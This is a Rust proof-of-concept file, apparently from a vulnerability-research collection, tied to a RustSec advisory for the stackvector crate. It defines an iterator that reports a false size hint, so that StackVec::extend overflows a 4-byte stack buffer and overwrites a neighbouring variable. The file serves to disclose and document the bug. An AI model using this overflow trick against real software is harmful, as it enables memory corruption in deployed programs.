/*!
```rudra-poc
[target]
crate = "stackvector"
version = "1.0.8"

[report]
issue_date = 2021-02-19
issue_url = "https://github.com/Alexhuszagh/rust-stackvector/issues/2"
rustsec_url = "https://github.com/RustSec/advisory-db/pull/847"

[[bugs]]
analyzer = "UnsafeDataflow"
bug_class = "InconsistencyAmplification"
rudra_report_locations = ["src/lib.rs:896:5: 920:6"]
```
!*/
#![forbid(unsafe_code)]

use stackvector::StackVec;

// An iterator that reports an incorrect size hint.
// -----
struct IncorrectIterator(u32);

impl IncorrectIterator {
    pub fn new() -> Self { IncorrectIterator(0) }
}

impl Iterator for IncorrectIterator {
    type Item = u8;

    fn next(&mut self) -> Option<Self::Item> {
        self.0 += 1;
        if (self.0 >= 20) {
            None
        } else {
            Some(0x41)
        }
    }

    fn size_hint(&self) -> (usize, Option<usize>) {
        let lower_bound = 20;
        let upper_bound = Some(0);
        (lower_bound, upper_bound)
    }
}
// -----

fn main() {
    let mut stack_vec = StackVec::<[u8; 4]>::new();
    let i : i32 = 42;

    // Causes a stack overflow overwriting i.
    stack_vec.extend(IncorrectIterator::new());

    println!("i: {}", i);
    assert!(i == 42);
}